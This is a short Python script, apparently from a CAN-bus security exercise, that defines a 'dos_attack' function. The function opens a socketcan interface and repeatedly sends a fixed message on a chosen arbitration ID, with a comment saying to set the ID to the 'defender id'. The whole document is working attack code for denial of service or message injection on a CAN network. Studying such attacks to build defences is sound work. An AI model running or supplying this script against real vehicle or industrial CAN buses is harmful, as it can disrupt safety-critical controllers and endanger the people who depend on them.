import can
import time

def dos_attack(target_arbitration_id, num_messages):

	bus = can.interface.Bus(channel='can0', bustype='socketcan')

	dos_messages = can.Message(arbitration_id=target_arbitration_id, data = [0x01,0x02,0x03],is_extended_id=False)


	for _ in range(num_messages):
		bus.send(dos_messages)
		time.sleep(0.1)

if __name__ == "__main__":

	target_arbitration_id = 0x456        # we have to change the id(defender id)
	num_messages = 100			# control the number of  messages


	dos_attack(target_arbitration_id, num_messages)

